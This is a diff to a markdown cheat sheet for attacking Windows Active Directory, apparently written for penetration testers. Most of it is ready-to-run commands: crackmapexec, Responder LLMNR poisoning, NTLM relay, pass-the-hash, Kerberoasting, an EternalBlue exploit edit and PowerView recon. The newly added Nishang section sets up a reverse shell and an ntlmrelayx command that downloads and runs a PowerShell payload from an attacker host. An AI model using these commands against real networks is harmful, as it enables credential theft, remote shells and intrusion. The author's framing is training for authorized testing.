@@ -1,9 +1,9 @@
 ![active-directory-monitoring](https://user-images.githubusercontent.com/84678370/127057641-382b4592-0b78-4883-b5e0-edae43e22556.png)
 
 
-* ### Author: __Hiou__ 
+* ### Author: __Hiou__
 
-* ### Linkedin: __https://www.linkedin.com/in/xl22glckz__  
+* ### Linkedin: __https://www.linkedin.com/in/xl22glckz__
 ## Summary
 - [__Main__](#Main-Enum)
 - [__RID__](#RID)
@@ -27,7 +27,8 @@
 - [__Spraying The Forest__](#Spraying-The-Forest)
 - [__Spray__](#Spray)
 - [__EternalBlue__](#EternalBlue)
-
+- [__Nishang__](#Nishang)
+- [__Powershell__](#Powershell)
 # Main Enum
 ````
 crackmapexec 10.10.10.0/24
@@ -114,13 +115,13 @@ cme smb 10.10.10.x -u '' -p ''
 
 cme smb 10.10.10.x -u '' -p '' --flag
 
-cme smb 10.10.10.x -u username -p password --flag  #Example: --users --obfs 
+cme smb 10.10.10.x -u username -p password --flag  #Example: --users --obfs
 
-cme smb 10.10.10.x 
+cme smb 10.10.10.x
 
 cme smb target/s -u /path/users.txt -p /path/passwords.txt
 
-cme smb 10.10.10.0/24 -u 'username' -p 'password'  
+cme smb 10.10.10.0/24 -u 'username' -p 'password'
 ````
 > ### _crackmapexec MSSQL_
 ````
@@ -140,7 +141,7 @@ nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='PEPE.L
 
 nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='PEPE.LOCAL',userdb=/path/usernames.txt ip
 ````
-> ### _Metasploit Enum_ 
+> ### _Metasploit Enum_
 - - https://www.hackingarticles.in/penetration-testing-windows-server-active-directory-using-metasploit-part-1/
 - - https://www.hackingarticles.in/penetration-testing-active-directory-using-metasploit-part-2/
 - - https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78
@@ -180,10 +181,10 @@ use post/windows/gather/enum_termserv
 # Attack
 
 > ### __LLMNR__
- 
+
 > __Here you will see a summary of how network poisoning works and how to launch the attack. I do this so that you do not launch it without knowing what it is doing, since network poisoning can cause damage such as DDos, production stoppage, etc. Remember that your job is also to solve problems and search for information on your own. It is useless to launch an attack if you do not know how it works, so I recommend that you inform yourself well of all the attacks and tools shown here so that you understand at a low level what you are doing, you can have control and do not cause damage.__
 
-> __Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.__ 
+> __Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.__
 
 - ((MITM)) Adversaries can spoof an authoritative source for name resolution in a victim network by responding to LLMNR (UDP 5355) / NBT-NS (UDP 137) traffic as if they knew the identity of the requested host, effectively poisoning the service so that victims communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will be sent to the adversary controlled system.
 
@@ -249,12 +250,12 @@ impacket-ntlmrelayx -tf targets.txt -smb2support
 
 responder -I interface -rdw
 ````
---- 
+---
 > ### _crackmapexec_ __Attack__
 ````
 cme smb 10.10.10.x -u 'username' -H 'NTLM hash'
 
-cme smb 10.10.10.x -u 'username' -p 'password' -x command 
+cme smb 10.10.10.x -u 'username' -p 'password' -x command
 
 cme smb 10.10.10.x -u 'username' -H 'NTLM hash' --sam
 
@@ -292,7 +293,7 @@ evil-winrm -i 10.10.10.x -u username -H 'hash NTLM' #-p port
 ````
 impacket-GetUserSPNs -rquest -dc-ip 10.10.10.x blackfield.local/username
 
-./kerbrute userenum --dc ip -d PEPE.local users.txt 
+./kerbrute userenum --dc ip -d PEPE.local users.txt
 ````
 > ### _AS-REP Roasting_
 ````
@@ -350,13 +351,13 @@ nmap -g 443 -f -sS --min-rate 1000 --script "vuln and safe" -p445 -Pn -v -n 10.1
 ````
 def smb_pwn(conn, arch):
 	smbConn = conn.get_smbconnection()
-	
+
 	print('creating file c:\\pwned.txt on the target')  <--- This obviously we do not want to do
 	tid2 = smbConn.connectTree('C$')
 	fid2 = smbConn.createFile(tid2, '/pwned.txt')
 	smbConn.closeFile(tid2, fid2)
 	smbConn.disconnectTree(tid2)
-	
+
     #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
     #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') <---
     # Note: there are many methods to get shell over SMB admin session
@@ -368,13 +369,13 @@ def smb_pwn(conn, arch):
 ````
 def smb_pwn(conn, arch):
 	smbConn = conn.get_smbconnection()
-	
+
 	#print('creating file c:\\pwned.txt on the target')  <--- Comment this
 	#tid2 = smbConn.connectTree('C$')
 	#fid2 = smbConn.createFile(tid2, '/pwned.txt')
 	#smbConn.closeFile(tid2, fid2)
 	#smbConn.disconnectTree(tid2)
-	
+
     #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
     service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') <--- Here define what you want to do
     # Note: there are many methods to get shell over SMB admin session
@@ -398,7 +399,7 @@ rlwrap nc -nlvp port
 
 rlwrap nc -nlvp port
 
-python3 eternalblue_exploit7.py 10.10.10.x <shellcode_file> 
+python3 eternalblue_exploit7.py 10.10.10.x <shellcode_file>
 ````
 >> _Metasploit-Recon_
 ````
@@ -408,3 +409,129 @@ use auxiliary/scanner/smb/smb_ms17_010
 ````
 use exploit/windows/smb/ms17_010_eternalblue
 ````
+
+> ### __Nishang__
+
+* * Nishang
+* * Powershell
+
+> _As Nishang says in his Github repository (a very interesting repository) his scripts are tags as malicious, which makes it very difficult for an antivirus to let them touch the "disk", that is why the "memory injection" method is used for Powershell._
+
+* * __https://github.com/samratashok/nishang__
+
+* * __Nishang With Ntlmrelayx__
+
+>> _responder.conf_
+
+````
+[Responder Core]
+
+; Servers to start
+SQL = On
+SMB = Off
+Kerberos = On
+FTP = On
+POP = On
+SMTP = On
+IMAP = On
+HTTP = Off
+HTTPS = On
+DNS = On
+LDAP = On
+````
+>> _Nishang Shell Conf_
+
+* __Open Powershelltcp.ps1 and at the end, paste this (change ip and port)__
+
+* * Invoke-PowerShellTcp -Reverse -IPAddress ip -Port port
+
+````
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress ip -Port port # <--- Here
+````
+>> _Python3 Simple Server_
+````
+python3 -m http.server port
+````
+>> _Listener_
+````
+rlwrap nc -nlvp port
+````
+>> _responder On_
+````
+responder -I interface -rdw
+````
+>> _ntlmrelayx Nishang_
+````
+impacket-ntlmrelayx -tf target-file -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ip:port/PowerShellTcp.ps1')" -smb2support
+````
+> ### __Powershell__
+- __https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1__
+- __https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon__
+
+- __https://www.pentesteracademy.com/course?id=21__
+- __https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf__
+- __https://www.varonis.com/blog/powershell-for-pentesters/__
+- __https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/?view=powershell-7.1__
+- __https://gist.github.com/HarmJ0y/3328d954607d71362e3c__
+
+* * __Process Architecture__
+```
+[Environment]::is64bitoperatingSystem
+
+[Environment]::is64bitprocess
+
+powershell.exe [Environment]::is64bitprocess > output.txt
+
+powershell.exe [Environment]::is64bitprocess > /path/to/file.txt
+```
+* * __Powerview Recon__
+> You must first download the PowerView on your machine and then transfer it to the victim machine. Above I have left two links that redirect to the PowerShellMafia github.
+```
+.\PowerView.ps1
+```
+```
+Get-NetUser
+
+Get-NetUser "pepe"
+
+Get-NetGroup
+
+Get-NetDomain
+
+Get-NetDomain -Domain "Pepe.com"
+
+Get-NetComputer
+
+Get-NetComputer -Unconstrained
+
+Get-NetComputer –OperatingSystem "os"
+```
+```
+Get-DomainSID
+
+Get-DomainPolicy
+
+Get-DomainPolicy -Domain pepe.local -DomainController <DC>
+
+Get-DomainController
+
+Get-DomainDNSZone
+
+Get-DomainDNSrecord
+```
+```
+Invoke-UserHunter -ShowAll
+
+Invoke-UserHunter -Unconstrained -ShowAll
+```
+```
+Get-ADUserResultantPasswordPolicy
+
+Get-ADUserResultantPasswordPolicy -Identity pepe
+```
